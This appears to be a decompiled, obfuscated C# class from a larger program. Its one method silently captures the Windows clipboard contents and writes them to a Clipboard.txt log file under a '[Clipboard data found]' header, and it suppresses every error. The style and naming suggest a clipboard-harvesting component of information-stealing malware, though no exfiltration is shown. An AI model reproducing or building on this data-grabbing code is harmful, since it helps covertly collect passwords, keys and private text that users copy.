using System;
using System.IO;
using System.Windows;

// Token: 0x02000047 RID: 71
internal class Class13
{
	// Token: 0x06000206 RID: 518 RVA: 0x000103EC File Offset: 0x0000E5EC
	public static void smethod_0(string string_0)
	{
		try
		{
			File.WriteAllText(string_0 + "\\Clipboard.txt", "[Clipboard data found] - [MM.dd.yyyy - HH:mm:ss]\r\n\r\n" + Clipboard.GetText() + "\r\n\r\n");
		}
		catch
		{
		}
	}

	// Token: 0x06000207 RID: 519 RVA: 0x0000446C File Offset: 0x0000266C
	public Class13()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}
}
